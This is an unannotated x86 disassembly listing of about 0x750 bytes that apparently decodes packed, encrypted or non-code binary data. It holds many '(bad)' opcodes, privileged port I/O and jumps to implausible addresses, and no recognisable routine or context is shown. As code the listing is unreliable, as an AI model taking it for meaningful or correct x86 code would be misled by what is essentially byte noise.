  40ab9d:	cmp    DWORD PTR [ecx+ebx*1],0xffffffe4
  40aba1:	pop    esp
  40aba2:	mov    ah,0x55
  40aba4:	or     al,0xc0
  40aba6:	repnz fs nop
  40aba9:	daa    
  40abaa:	push   esi
  40abab:	js     0x40ab85
  40abad:	push   edi
  40abae:	mov    WORD PTR [edi],ss
  40abb0:	and    DWORD PTR [ebx+0x58e4300c],eax
  40abb6:	xchg   ecx,eax
  40abb7:	and    eax,DWORD PTR [edi-0x5e]
  40abba:	inc    eax
  40abbb:	jbe    0x40ac0e
  40abbd:	call   0xaad9a81a
  40abc2:	into   
  40abc3:	int    0x59
  40abc5:	mov    al,0xc1
  40abc7:	push   ds
  40abc8:	pop    ecx
  40abc9:	ds dec ecx
  40abcb:	shl    DWORD PTR [eax],0x22
  40abce:	ret    
  40abcf:	fbld   TBYTE PTR [edi]
  40abd1:	dec    ebp
  40abd2:	shl    DWORD PTR [edi+esi*4+0x8],cl
  40abd6:	fiadd  DWORD PTR [ebx+eax*1]
  40abd9:	adc    al,0x24
  40abdb:	cmp    BYTE PTR [eax+0x34],cl
  40abde:	dec    ebp
  40abdf:	shl    DWORD PTR [eax+ebx*2],cl
  40abe2:	push   0xd29c8c7c
  40abe7:	xor    al,0x4d
  40abe9:	shl    DWORD PTR [eax-0xf1f2f40],cl
  40abef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf0:	imul   ebx,DWORD PTR [edx+0xc00dbe6],0xc6403020
  40abfa:	sahf   
  40abfb:	jecxz  0x40abb2
  40abfd:	push   esp
  40abfe:	add    DWORD PTR fs:0xc8b0a03,ebp
  40ac05:	and    bl,dl
  40ac07:	in     eax,dx
  40ac08:	aaa    
  40ac09:	loop   0x40ac47
  40ac0b:	add    ecx,DWORD PTR [ebx+edi*2+0x19]
  40ac0f:	mov    edi,0x61252c50
  40ac14:	push   0x9e616d6f
  40ac19:	sbb    al,0xf9
  40ac1b:	in     al,dx
  40ac1c:	inc    ebx
  40ac1d:	add    DWORD PTR [ebx],ebx
  40ac1f:	mov    BYTE PTR [eax-0x7fff67f9],al
  40ac25:	lods   al,BYTE PTR ds:[esi]
  40ac26:	cmp    BYTE PTR [edx+esi*8-0x15],0x98
  40ac2b:	xor    eax,DWORD PTR [eax-0x237f33f9]
  40ac31:	add    BYTE PTR [eax-0x71bb955a],al
  40ac37:	lock and BYTE PTR [edx],0x77
  40ac3b:	jb     0x40ac21
  40ac3d:	iret   
  40ac3e:	jne    0x40ac47
  40ac40:	adc    ah,ch
  40ac42:	pop    es
  40ac43:	and    al,0x0
  40ac45:	push   DWORD PTR [edi+edi*8]
  40ac48:	repnz leave 
  40ac4a:	scas   eax,DWORD PTR es:[edi]
  40ac4b:	arpl   WORD PTR [edi],bp
  40ac4d:	inc    DWORD PTR [edi]
  40ac4f:	pop    eax
  40ac50:	jmp    FWORD PTR [eax+0x0]
  40ac53:	call   FWORD PTR [edi+0x7c393f3f]
  40ac59:	dec    DWORD PTR [eax+eax*8-0x59633f24]
  40ac60:	retf   0xb4f0
  40ac63:	jmp    FWORD PTR [esi-0x11]
  40ac66:	repz xchg ecx,eax
  40ac68:	sti    
  40ac69:	enter  0xa0a0,0xa4
  40ac6d:	fmul   DWORD PTR [edx]
  40ac6f:	inc    eax
  40ac70:	pop    es
  40ac71:	in     al,dx
  40ac72:	add    ah,ah
  40ac74:	leave  
  40ac75:	xchg   ebx,eax
  40ac76:	inc    edi
  40ac77:	sbb    eax,0x11c0c04
  40ac7c:	xor    al,0xf
  40ac7e:	sahf   
  40ac7f:	cmp    al,0x79
  40ac81:	repnz dec esp
  40ac83:	adc    al,0x60
  40ac85:	adc    BYTE PTR [eax+0x12],bh
  40ac88:	mov    WORD PTR [ecx],cs
  40ac8a:	cmp    eax,0x574c7dd9
  40ac8f:	and    BYTE PTR [edi],cl
  40ac91:	mov    eax,0xc91ccc1b
  40ac96:	xchg   ebx,eax
  40ac97:	inc    edi
  40ac98:	sahf   
  40ac99:	pop    es
  40ac9a:	in     al,dx
  40ac9b:	adc    DWORD PTR [esi],ebx
  40ac9d:	adc    BYTE PTR ds:0x793c0e24,cl
  40aca3:	repnz in al,0x38
  40aca6:	sbb    dl,BYTE PTR [eax+0xb]
  40aca9:	add    eax,DWORD PTR fs:[eax+0x4f279313]
  40acb0:	sahf   
  40acb1:	pushf  
  40acb2:	sbb    BYTE PTR [edi+edx*1+0x793b04d0],bh
  40acb9:	in     al,0xc9
  40acbb:	in     al,0x1e
  40acbd:	hlt    
  40acbe:	sbb    eax,0x2007081f
  40acc3:	out    dx,eax
  40acc4:	repnz in al,dx
  40acc6:	leave  
  40acc7:	scas   al,BYTE PTR es:[edi]
  40acc8:	pop    ds
  40acc9:	sysenter 
  40accb:	add    BYTE PTR [ebp+edx*1+0x7],al
  40accf:	pop    eax
  40acd0:	push   ss
  40acd1:	dec    esp
  40acd2:	sahf   
  40acd3:	cmp    al,0x79
  40acd5:	jo     0x40acdc
  40acd7:	test   BYTE PTR [esi],al
  40acd9:	cwde   
  40acda:	or     BYTE PTR [edi],ah
  40acdc:	(bad)  
  40acdd:	in     al,dx
  40acde:	bound  esp,QWORD PTR [edi+0x7]
  40ace1:	clc    
  40ace2:	add    DWORD PTR [eax],esp
  40ace4:	adc    BYTE PTR [edx],al
  40ace6:	sub    dl,dh
  40ace8:	in     al,0xc9
  40acea:	xchg   ebx,eax
  40aceb:	dec    ebp
  40acec:	inc    eax
  40aced:	adc    BYTE PTR [ecx+eax*4+0x70],0x82
  40acf2:	dec    edi
  40acf3:	sahf   
  40acf4:	cmp    al,0x79
  40acf6:	mov    BYTE PTR [esi-0x5e477760],al
  40acfc:	aam    0xa2
  40acfe:	repnz in al,0x91
  40ad01:	daa    
  40ad02:	in     al,dx
  40ad03:	mov    cl,0x21
  40ad05:	add    al,0xb2
  40ad07:	sbb    al,0xba
  40ad09:	dec    edi
  40ad0a:	sahf   
  40ad0b:	cmp    al,0x79
  40ad0d:	xor    al,0xcc
  40ad0f:	dec    esp
  40ad10:	fisub  WORD PTR [esi+ebp*8+0x7c]
  40ad14:	dec    DWORD PTR [ebp+0x4d]
  40ad17:	pop    ds
  40ad18:	daa    
  40ad19:	cwde   
  40ad1a:	jae    0x40ad1e
  40ad1c:	fld    DWORD PTR [ecx*8+0x342dd706]
  40ad23:	add    ebp,DWORD PTR [ebx]
  40ad25:	or     eax,0xd090b71
  40ad2a:	adc    DWORD PTR [edx-0x3f],ebx
  40ad2d:	jne    0x40ad8c
  40ad2f:	push   cs
  40ad30:	adc    ecx,DWORD PTR [ebx+ebx*1]
  40ad33:	mov    edi,db6
  40ad36:	sar    ebx,0x5e
  40ad39:	retf   0xfbd8
  40ad3c:	or     ch,BYTE PTR [edx-0x51]
  40ad3f:	add    al,0x80
  40ad41:	or     BYTE PTR ds:0x105ef1e,bh
  40ad47:	or     al,0x4f
  40ad49:	dec    ebx
  40ad4a:	icebp  
  40ad4b:	pop    esi
  40ad4c:	mov    al,0xef
  40ad4e:	addr16 add al,0xff
  40ad51:	or     BYTE PTR [ecx],al
  40ad53:	or     al,0x9a
  40ad55:	(bad)  [ebx-0x6bd1d062]
  40ad5b:	out    0x4d,eax
  40ad5d:	pushf  
  40ad5e:	pop    es
  40ad5f:	loope  0x40ad15
  40ad61:	in     al,0xaf
  40ad63:	sar    DWORD PTR [edx-0x4a],0xc3
  40ad67:	dec    esp
  40ad68:	int3   
  40ad69:	mov    bh,0x74
  40ad6b:	not    DWORD PTR [edi-0x62fbae13]
  40ad71:	pop    es
  40ad72:	sbb    al,0x40
  40ad74:	adc    BYTE PTR [eax],cl
  40ad76:	int3   
  40ad77:	jmp    0x1faf:0x80f935e
  40ad7e:	cmp    al,BYTE PTR [edi]
  40ad80:	add    al,0xdd
  40ad82:	adc    al,0x37
  40ad84:	hlt    
  40ad85:	mov    edx,0x9ae7fc3b
  40ad8a:	outs   dx,BYTE PTR ds:[esi]
  40ad8b:	mov    al,0xc3
  40ad8d:	inc    esp
  40ad8e:	daa    
  40ad8f:	ins    BYTE PTR es:[edi],dx
  40ad90:	sbb    al,0x13
  40ad92:	dec    ebx
  40ad93:	sbb    eax,0x4d5dba68
  40ad98:	daa    
  40ad99:	dec    esp
  40ad9a:	les    ebp,FWORD PTR [ebx]
  40ad9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad9d:	add    al,0x8f
  40ad9f:	jbe    0x40ada8
  40ada1:	dec    esp
  40ada2:	shl    DWORD PTR [edi+0x44],cl
  40ada5:	cld    
  40ada6:	push   ebx
  40ada7:	aas    
  40ada8:	push   edx
  40ada9:	adc    al,0x5d
  40adab:	ja     0x40ad4d
  40adad:	jmp    0x4f4cc1e5
  40adb2:	pop    es
  40adb3:	add    al,0x3
  40adb5:	adc    BYTE PTR [edx+0x1b01b027],bh
  40adbb:	xor    al,0x3b
  40adbd:	dec    ebp
  40adbe:	add    ebx,DWORD PTR fs:[edi+esi*8-0x24]
  40adc3:	adc    ebp,DWORD PTR [eax+0x6c]
  40adc6:	das    
  40adc7:	dec    esp
  40adc8:	aam    0xb
  40adca:	pop    ss
  40adcb:	ret    
  40adcc:	out    dx,al
  40adcd:	or     DWORD PTR [ebx*2-0x23b2401f],edi
  40add4:	xchg   ebx,eax
  40add5:	loope  0x40adc3
  40add7:	add    ecx,esp
  40add9:	out    0x80,eax
  40addb:	add    edx,DWORD PTR [edi-0x14131c8d]
  40ade1:	sahf   
  40ade2:	cmp    eax,DWORD PTR [ebx+eiz*4]
  40ade5:	cld    
  40ade6:	stos   DWORD PTR es:[edi],eax
  40ade7:	pop    ds
  40ade8:	jae    0x40ae2a
  40adea:	imul   ebx,DWORD PTR [esi+0x4daf03c0],0x27
  40adf1:	rep lods al,BYTE PTR ds:[esi]
  40adf3:	xchg   ebx,eax
  40adf4:	loope  0x40adba
  40adf6:	cmp    BYTE PTR [ecx-0x60],ch
  40adf9:	jmp    0xd375a259
  40adfe:	or     al,0x4d
  40ae00:	fld    QWORD PTR [ecx+0x4da7106f]
  40ae06:	pop    ds
  40ae07:	mov    esp,0x74209bc7
  40ae0c:	dec    ebp
  40ae0d:	xlat   BYTE PTR ds:[ebx]
  40ae0e:	je     0x40ae2b
  40ae10:	xor    al,0xec
  40ae12:	inc    edi
  40ae13:	adc    al,0xac
  40ae15:	or     edx,DWORD PTR [eax+eiz*8+0x7b]
  40ae19:	jo     0x40addb
  40ae1b:	out    0x3b,eax
  40ae1d:	mov    ds:0x6e7beec,eax
  40ae22:	jmp    0x336cd22e
  40ae27:	inc    edi
  40ae28:	xor    edi,DWORD PTR [esi+edi*1-0x7c166090]
  40ae2f:	lock xchg ebx,eax
  40ae31:	dec    esp
  40ae32:	or     ebx,DWORD PTR [ebx-0x6c]
  40ae35:	into   
  40ae36:	loopne 0x40adf8
  40ae38:	imul   edi,DWORD PTR [ebx+esi*8],0x3b33e183
  40ae3f:	mov    bl,0xeb
  40ae41:	scas   eax,DWORD PTR es:[edi]
  40ae42:	dec    esp
  40ae43:	add    ecx,DWORD PTR [ebp+0x74]
  40ae46:	arpl   WORD PTR [esi+0x4],cx
  40ae49:	xchg   ebx,eax
  40ae4a:	inc    ebx
  40ae4b:	addr16 mov edx,0x24413fdd
  40ae51:	subps  xmm0,XMMWORD PTR [edi]
  40ae54:	loope  0x40ae09
  40ae56:	mov    edx,0x64dd7077
  40ae5b:	jnp    0x40ae75
  40ae5d:	bswap  edi
  40ae5f:	stos   DWORD PTR es:[edi],eax
  40ae60:	(bad)  
  40ae61:	dec    ebp
  40ae62:	add    BYTE PTR [edi],cl
  40ae64:	scas   al,BYTE PTR es:[edi]
  40ae65:	sti    
  40ae66:	jmp    FWORD PTR [edi+ebx*2-0x7398f4c8]
  40ae6d:	add    al,0x52
  40ae6f:	inc    ebp
  40ae70:	test   BYTE PTR [ecx-0x7774da9f],bh
  40ae76:	add    BYTE PTR [eax],cl
  40ae78:	adc    DWORD PTR fs:[eax+0x2e],eax
  40ae7c:	fild   WORD PTR [ecx]
  40ae7e:	add    BYTE PTR [ecx],0x70
  40ae81:	add    ecx,DWORD PTR [eax+eax*2]
  40ae84:	cwde   
  40ae85:	adc    eax,0x805c4604
  40ae8a:	adc    BYTE PTR [ecx+0x55b2aa04],dl
  40ae90:	add    BYTE PTR [eax+eax*1],ch
  40ae93:	adc    BYTE PTR [ecx+0x2887ff03],al
  40ae99:	sub    al,BYTE PTR [esi]
  40ae9b:	add    BYTE PTR [eax+eax*1+0x56],al
  40ae9f:	add    BYTE PTR [ebx+0x0],al
  40aea2:	dec    esp
  40aea3:	add    BYTE PTR [edi-0x4d],bh
  40aea6:	mov    ecx,0xb419b
  40aeab:	push   eax
  40aeac:	pop    es
  40aead:	or     eax,0x4500474b
  40aeb2:	add    BYTE PTR [ecx+0x0],cl
  40aeb5:	dec    esi
  40aeb6:	retf   0x42d4
  40aeb9:	push   ebp
  40aeba:	and    al,0x4f
  40aebc:	fucomi st,st(5)
  40aebe:	mov    edi,0xf097237d
  40aec3:	push   ecx
  40aec4:	add    BYTE PTR [eax+0x22],al
  40aec7:	push   ss
  40aec8:	pop    edi
  40aec9:	add    BYTE PTR [ebx+0x27ea005b],ch
  40aecf:	or     edi,edi
  40aed1:	(bad)  
  40aed2:	(bad)  
  40aed3:	call   DWORD PTR [ebx+0x0]
  40aed6:	mov    DWORD PTR [eax+0x0],esi
  40aed9:	hlt    
  40aeda:	test   al,0x0
  40aedc:	pop    esp
  40aedd:	fwait
  40aede:	add    BYTE PTR [esp+esi*2+0xa0a700],al
  40aee5:	cwde   
  40aee6:	ret    
  40aee7:	add    ah,bh
  40aee9:	cmp    eax,DWORD PTR [eax]
  40aeeb:	fs xchg ebx,eax
  40aeed:	add    BYTE PTR [eax+ebx*4+0xadbd00],cl
  40aef4:	(bad)  
  40aef5:	(bad)  
  40aef6:	(bad)  
  40aef7:	jmp    DWORD PTR [eax-0x6a]
  40aefa:	add    BYTE PTR [ecx-0x206cff10],al
  40af00:	add    BYTE PTR [ebx],ch
  40af02:	iret   
  40af03:	add    dl,bh
  40af05:	jne    0x40af07
  40af07:	in     eax,dx
  40af08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af09:	add    bl,dh
  40af0b:	aas    
  40af0c:	add    BYTE PTR [esi+ebp*8],ah
  40af0f:	add    BYTE PTR [ecx-0x26],bl
  40af12:	add    BYTE PTR [ebx+0x21530007],bh
  40af18:	std    
  40af19:	push   esi
  40af1b:	inc    DWORD PTR [eax]
  40af1d:	daa    
  40af1e:	or     BYTE PTR [eax],al
  40af20:	cmc    
  40af21:	test   DWORD PTR [eax],0xb000dd6f
  40af27:	mov    eax,DWORD PTR [edi+0x54]
  40af2a:	add    BYTE PTR [edi],bl
  40af2c:	xchg   ebp,eax
  40af2d:	add    BYTE PTR [eax-0x4d],bh
  40af30:	add    BYTE PTR [eax+ebx*8-0x622300],bh
  40af37:	fistp  QWORD PTR [esi+0x8f4abd]
  40af3d:	(bad)  [edx+0x7]
  40af40:	adc    BYTE PTR [eax],al
  40af42:	mov    BYTE PTR [esi],ah
  40af44:	leave  
  40af45:	cmp    BYTE PTR [eax],al
  40af47:	cmp    eax,DWORD PTR [edi+0x6bd300]
  40af4d:	shl    DWORD PTR [eax+eax*1-0x24048949],1
  40af54:	push   DWORD PTR ds:0x3300e777
  40af5a:	jg     0x40af5c
  40af5c:	mov    edi,0x5f1e8462
  40af61:	sahf   
  40af62:	push   ds
  40af63:	pop    ecx
  40af64:	mov    bh,0xff
  40af66:	out    dx,al
  40af67:	fild   DWORD PTR [eax]
  40af69:	xchg   edx,eax
  40af6a:	mov    al,ds:0x5b00d0b9
  40af6f:	pop    edi
  40af70:	rol    BYTE PTR [eax],0x74
  40af73:	sub    BYTE PTR [eax],al
  40af75:	fcomp  QWORD PTR [ebx]
  40af77:	add    BYTE PTR [esp+eax*2],cl
  40af7a:	scas   eax,DWORD PTR es:[edi]
  40af7b:	sub    eax,0xdb6fdb6f
  40af80:	add    al,ch
  40af82:	enter  0x41e9,0x1b
  40af86:	add    BYTE PTR [bp+di-0x1c3f],dh
  40af8b:	push   0x5f
  40af8d:	sbb    al,BYTE PTR [eax]
  40af8f:	movzx  ebx,ch
  40af92:	inc    eax
  40af93:	shr    BYTE PTR [ecx+0x0],0xe4
  40af97:	hlt    
  40af98:	add    BYTE PTR [esi],dh
  40af9a:	push   cs
  40af9b:	push   ds
  40af9c:	fdivp  st(7),st
  40af9e:	imul   ch
  40afa0:	in     eax,dx
  40afa1:	les    edi,FWORD PTR [edi+0x290057f1]
  40afa7:	jp     0x40aff7
  40afa9:	and    al,BYTE PTR [eax]
  40afab:	das    
  40afac:	xchg   ebp,eax
  40afad:	or     DWORD PTR [ecx],eax
  40afaf:	add    BYTE PTR [ebx],al
  40afb1:	dec    edi
  40afb2:	add    BYTE PTR [ebx-0x6804900a],bl
  40afb8:	ins    DWORD PTR es:[edi],dx
  40afb9:	or     al,BYTE PTR [eax]
  40afbb:	out    dx,ax
  40afbd:	add    BYTE PTR [esi-0x40b8e83b],ah
  40afc3:	mov    eax,ds:0xddb700a6
  40afc8:	(bad)  [esi+0x59f580db]
  40afcf:	cmp    al,0x80
  40afd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afd2:	jecxz  0x40b043
  40afd4:	mov    edi,0x85ffa95f
  40afd9:	in     eax,0xff
  40afdb:	add    BYTE PTR [edi],dl
  40afdd:	sbb    DWORD PTR [eax],eax
  40afdf:	sbb    bh,BYTE PTR [ebx+0xfeee00]
  40afe5:	iret   
  40afe6:	mov    bh,0x1f
  40afe8:	pop    esp
  40afe9:	int3   
  40afea:	add    BYTE PTR [edi-0x50efff83],al
  40aff0:	jnp    0x40afcd
  40aff2:	mov    dh,0xff
  40aff4:	add    bl,ah
  40aff6:	fld    DWORD PTR [eax]
  40aff8:	jge    0x40af8c
  40affa:	add    BYTE PTR [esi],ah
  40affc:	fstp   TBYTE PTR [esi]
  40affe:	retf   
  40afff:	bound  ebp,QWORD PTR [ebx+0x4d00ec5f]
  40b005:	into   
  40b006:	outs   dx,DWORD PTR ds:[esi]
  40b007:	aaa    
  40b008:	xlat   BYTE PTR ds:[ebx]
  40b009:	jle    0x40afd2
  40b00b:	jmp    0x9c0e1b10
  40b010:	pop    edi
  40b011:	mov    edi,0x2e5cf582
  40b016:	add    BYTE PTR [ecx],bl
  40b018:	clc    
  40b019:	jle    0x40b08e
  40b01b:	test   DWORD PTR [edi],ebx
  40b01d:	push   ss
  40b01e:	pop    edi
  40b01f:	jge    0x40b033
  40b021:	or     eax,0xbf0e6900
  40b026:	imul   eax,DWORD PTR [ebp-0x72a08849],0x22007ef1
  40b030:	pop    edi
  40b031:	clc    
  40b032:	add    BYTE PTR [edx-0x1b],ch
  40b035:	jmp    0x3ac3b070
  40b03a:	sti    
  40b03b:	fild   DWORD PTR [ebp+0x15e89c2]
  40b041:	(bad)
  40b045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b046:	add    BYTE PTR [edx-0x43],al
  40b049:	add    BYTE PTR [eax+0x7685bb0e],ah
  40b04f:	popa   
  40b050:	stos   DWORD PTR es:[edi],eax
  40b051:	xor    al,0xef
  40b053:	mov    dh,0x95
  40b055:	cs jb  0x40b017
  40b058:	rol    DWORD PTR [eax],1
  40b05a:	mov    ah,0xdf
  40b05c:	or     dh,BYTE PTR [edi-0x7972f766]
  40b062:	pop    ds
  40b063:	dec    ebp
  40b064:	ror    DWORD PTR [esi+0xee07900],cl
  40b06a:	push   esi
  40b06c:	ins    DWORD PTR es:[edi],dx
  40b06d:	xor    ebx,DWORD PTR [edi]
  40b06f:	cmp    esi,edx
  40b071:	(bad)
  40b074:	add    bl,bh
  40b076:	pop    edi
  40b077:	add    esi,esp
  40b079:	add    BYTE PTR [ecx-0x26],dl
  40b07c:	add    dl,al
  40b07e:	lods   eax,DWORD PTR ds:[esi]
  40b07f:	pop    ebp
  40b080:	(bad)  
  40b081:	xchg   edi,eax
  40b082:	(bad)  
  40b084:	add    dl,cl
  40b086:	inc    ebp
  40b087:	add    BYTE PTR [edi],ah
  40b089:	(bad)  
  40b08a:	add    BYTE PTR [ebx],ah
  40b08c:	sub    eax,0xbb80953e
  40b091:	ins    DWORD PTR es:[edi],dx
  40b092:	outs   dx,DWORD PTR ds:[esi]
  40b093:	fucomi st,st(2)
  40b095:	aaa    
  40b096:	pop    edi
  40b097:	inc    ebx
  40b098:	outs   dx,BYTE PTR ds:[esi]
  40b099:	sbb    eax,0x4bc20600
  40b09e:	pop    edi
  40b09f:	jns    0x40b0b7
  40b0a1:	sub    al,0x7d
  40b0a3:	fisttp DWORD PTR [ebp*2-0x5b2073fc]
  40b0aa:	jp     0x40b04d
  40b0ac:	sbb    DWORD PTR [esi],esp
  40b0ae:	add    BYTE PTR [ebx-0x47],dh
  40b0b1:	jge    0x40b0ea
  40b0b3:	mov    esi,0x6e915f
  40b0b8:	fstp   DWORD PTR [edi]
  40b0ba:	cmp    al,BYTE PTR [edi-0x4440ada4]
  40b0c0:	dec    esi
  40b0c1:	push   DWORD PTR [esi+0x61]
  40b0c4:	jecxz  0x40b07e
  40b0c6:	adc    esi,DWORD PTR [ecx+0x5faf6210]
  40b0cc:	mov    eax,0xa5aa00
  40b0d1:	nop
  40b0d2:	jbe    0x40b096
  40b0d4:	push   esi
  40b0d5:	dec    bl
  40b0d7:	add    bl,al
  40b0d9:	retf   
  40b0da:	sahf   
  40b0db:	add    BYTE PTR [ecx-0x2875ff7b],cl
  40b0e1:	jge    0x40b065
  40b0e3:	pop    es
  40b0e4:	jg     0x40b0df
  40b0e6:	outs   dx,DWORD PTR ds:[esi]
  40b0e7:	fucomi st,st(1)
  40b0e9:	push   cs
  40b0ea:	jmp    0x40b14b
  40b0ec:	or     esi,esi
  40b0ee:	add    BYTE PTR [ecx-0x21],ah
  40b0f1:	add    BYTE PTR [edx-0x25ffe301],dh
  40b0f7:	push   ebp
  40b0f8:	add    ah,al
  40b0fa:	inc    DWORD PTR [edx-0x5]
  40b0fd:	in     eax,0xc6
  40b0ff:	add    BYTE PTR [ebx],dl
  40b101:	cmp    eax,0x313900ce
  40b106:	push   cs
  40b107:	fbstp  TBYTE PTR [ebx+0x23]
  40b10a:	add    BYTE PTR [edx],dh
  40b10c:	sub    eax,0xc376200
  40b111:	fistp  WORD PTR [esi+0x116e58ee]
  40b117:	ja     0x40b119
  40b119:	add    bl,BYTE PTR [edi]
  40b11b:	arpl   WORD PTR [edx],cx
  40b11d:	add    eax,0xdb6ff96d
  40b122:	add    BYTE PTR [eax-0x74],dh
  40b125:	arpl   WORD PTR [edi+0x6b],bx
  40b128:	jle    0x40b12a
  40b12a:	jmp    0x776ab191
  40b12f:	fwait
  40b130:	es in  eax,dx
  40b132:	mov    dh,0x6d
  40b134:	sbb    esp,DWORD PTR [edi]
  40b136:	dec    edi
  40b137:	mov    dh,0x8b
  40b139:	pop    edi
  40b13a:	lahf   
  40b13b:	mov    al,0xc1
  40b13d:	les    ecx,FWORD PTR [ebp+edx*1-0x604b9392]
  40b144:	pop    edi
  40b145:	add    esi,edi
  40b147:	push   edi
  40b148:	sbb    al,cl
  40b14a:	fistp  QWORD PTR [ebx+eiz*1]
  40b14d:	fnsave [esi-0x27b8c2ec]
  40b153:	mov    edi,0xc8054418
  40b158:	xor    edx,edx
  40b15a:	mov    WORD PTR [ebx-0x73207ece],ds
  40b160:	cmp    al,0x23
  40b162:	int    0xa8
  40b164:	int3   
  40b165:	hlt    
  40b166:	icebp  
  40b167:	int    0xcd
  40b169:	enter  0xd233,0xe6
  40b16d:	repnz mov ecx,DWORD PTR [esi]
  40b170:	mov    al,0xd2
  40b172:	mov    WORD PTR [ebx+eiz*1],?
  40b175:	or     DWORD PTR [ebp-0x32dca5da],ebp
  40b17b:	enter  0x3933,0x77
  40b17f:	ins    DWORD PTR es:[edi],dx
  40b180:	sbb    BYTE PTR fs:[edx+0xcb23fc],bh
  40b187:	inc    ecx
  40b188:	adc    al,0x54
  40b18a:	xor    eax,DWORD PTR [eax]
  40b18c:	sub    esp,ebx
  40b18e:	add    BYTE PTR [ebx+ebp*8-0x3d371287],al
  40b195:	push   esi
  40b196:	inc    ecx
  40b197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b198:	cmp    DWORD PTR [edi+0x3d],0x34d77314
  40b19f:	adc    al,0x6e
  40b1a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a2:	pushf  
  40b1a3:	jns    0x40b204
  40b1a5:	stos   DWORD PTR es:[edi],eax
  40b1a6:	mov    ecx,0x48dddf91
  40b1ab:	xor    esi,edx
  40b1ad:	mov    WORD PTR [edi-0x73f826ce],ss
  40b1b3:	xor    al,0x23
  40b1b5:	iret   
  40b1b6:	fsub   QWORD PTR [ecx+ebx*8]
  40b1b9:	push   ecx
  40b1ba:	out    dx,eax
  40b1bb:	iret   
  40b1bc:	dec    eax
  40b1bd:	xor    esi,edx
  40b1bf:	jle    0x40b1c9
  40b1c1:	imul   ebp,DWORD PTR ds:0x348cf290,0x23
  40b1c8:	sub    BYTE PTR [ebp-0x30dc55ab],al
  40b1ce:	dec    eax
  40b1cf:	xor    edx,DWORD PTR [edi+ebx*8+0x69]
  40b1d3:	int3   
  40b1d4:	call   0x84f9:0x348cf233
  40b1db:	push   ss
  40b1dc:	mov    al,ds:0x48cf2334
  40b1e1:	add    ebx,ebp
  40b1e3:	cmp    ch,ah
  40b1e5:	sub    eax,0x8cf23348
  40b1ea:	nop
  40b1eb:	cmp    dx,WORD PTR [ebx-0x74]
  40b1ef:	xor    al,0x23
  40b1f1:	iret   
  40b1f2:	or     eax,0xdbd2048
  40b1f7:	iret   
  40b1f8:	dec    eax
  40b1f9:	xor    esi,edx
  40b1fb:	xchg   edx,eax
  40b1fc:	inc    ebx
  40b1fd:	xchg   DWORD PTR [esp+eiz*8-0xe],edi
  40b201:	mov    WORD PTR [ebx+eiz*1],?
  40b204:	jno    0x40b1f7
  40b206:	pushf  
  40b207:	ficom  WORD PTR [ebp-0x46c69b81]
  40b20d:	push   esi
  40b20e:	sub    ecx,DWORD PTR [esi+0xb5ba00]
  40b214:	xor    BYTE PTR [esi-0x26],ah
  40b217:	mov    dh,0xdb
  40b219:	mov    dh,0x5f
  40b21b:	fucomp st(4)
  40b21d:	cdq    
  40b21e:	xor    eax,0xcc5fc77a
  40b223:	push   eax
  40b224:	lea    esi,[esi-0x55]
  40b227:	std    
  40b228:	pop    edx
  40b229:	sbb    eax,0x86e91f8e
  40b22e:	inc    ecx
  40b22f:	or     ah,BYTE PTR [edx+0x4fad5fef]
  40b235:	pop    ebx
  40b236:	(bad)  [esi]
  40b238:	in     al,dx
  40b239:	gs mov edi,0xde05bfb6
  40b23f:	mov    dh,0xb6
  40b241:	adc    eax,0xca135bb6
  40b246:	pop    ss
  40b247:	pop    edi
  40b248:	cmp    eax,0xeb60216
  40b24d:	outs   dx,DWORD PTR ds:[esi]
  40b24e:	adc    eax,0x5f2bdb6e
  40b253:	pop    ecx
  40b254:	and    BYTE PTR [ecx],ah
  40b256:	xor    DWORD PTR [edi+edi*2],0xffffff8b
  40b25a:	imul   eax,DWORD PTR [eax],0xf95b4bb5
  40b260:	sbb    dl,BYTE PTR ds:0x5f069800
  40b266:	adc    al,0x74
  40b268:	stc    
  40b269:	test   DWORD PTR [esi],ecx
  40b26b:	ins    DWORD PTR es:[edi],dx
  40b26c:	test   eax,0xcd1f705d
  40b271:	jb     0x40b260
  40b273:	jmp    0xbba02d89
  40b278:	mov    ecx,0x6e9bb616
  40b27d:	rcl    DWORD PTR [esi],1
  40b27f:	inc    edx
  40b280:	jg     0x40b2e7
  40b282:	dec    edx
  40b283:	lds    edx,FWORD PTR [ebx+0x5b]
  40b286:	stc    
  40b287:	outs   dx,DWORD PTR ds:[esi]
  40b288:	pop    ebx
  40b289:	mov    WORD PTR [ebx+0xbeaa5f],fs
  40b28f:	test   eax,0xb76a0059
  40b294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b295:	mov    ds:0x5b6db5dc,al
  40b29a:	popf   
  40b29b:	jbe    0x40b253
  40b29d:	retf   
  40b29e:	pop    edi
  40b29f:	std    
  40b2a0:	fild   WORD PTR [ebx]
  40b2a2:	add    BYTE PTR [edx-0x2c186468],dl
  40b2a8:	clc    
  40b2a9:	sbb    BYTE PTR [esi-0x45ffd2de],ah
  40b2af:	pop    ebx
  40b2b0:	clc    
  40b2b1:	fisubr DWORD PTR [esi+0x30]
  40b2b4:	ror    BYTE PTR [ebp-0x80],cl
  40b2b7:	into   
  40b2b8:	jg     0x40b2e3
  40b2ba:	push   ss
  40b2bb:	xor    edi,edx
  40b2bd:	fcmovnb st,st(2)
  40b2bf:	mov    bh,0x76
  40b2c1:	loop   0x40b2f2
  40b2c3:	pop    edi
  40b2c4:	sahf   
  40b2c5:	sub    ah,BYTE PTR ds:0x43349400
  40b2cb:	pop    edi
  40b2cc:	imul   edx,esi,0xffffffba
  40b2cf:	push   eax
  40b2d0:	(bad)  
  40b2d1:	push   ds
  40b2d2:	add    BYTE PTR [ecx],cl
  40b2d4:	add    DWORD PTR [eax],0x25e570a
  40b2da:	std    
  40b2db:	inc    esi
  40b2dc:	push   cs
  40b2dd:	mov    dh,0x6d
  40b2df:	ins    DWORD PTR es:[edi],dx
  40b2e0:	fld    TBYTE PTR [ebx+0x5f]
  40b2e3:	scas   eax,DWORD PTR es:[edi]
  40b2e4:	or     esp,ecx
  40b2e6:	aaa    
  40b2e7:	xor    dl,ah
  40b2e9:	retf   
  40b2ea:	jge    0x40b2e6
